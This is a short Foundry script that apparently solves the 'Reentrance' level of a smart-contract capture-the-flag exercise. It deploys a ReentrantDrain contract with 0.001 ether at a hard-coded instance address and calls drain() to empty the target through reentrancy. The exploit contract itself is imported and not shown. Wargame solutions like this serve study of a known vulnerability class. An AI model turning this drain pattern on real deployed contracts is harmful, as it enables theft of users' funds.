// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import {Script, console} from "forge-std/Script.sol";
import {Reentrance, ReentrantDrain} from "../src/Lv-10/Reentrance.sol";

contract ReentranceScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN Reentrance INSTANCE ADDRESS
        ReentrantDrain _drainer = new ReentrantDrain{value: 0.001 ether}(
            0x23331b9f5a58A7f2A8ff58464CD6391FaAACAB4D
        );
        
        _drainer.drain();

        vm.stopBroadcast();
    }
}
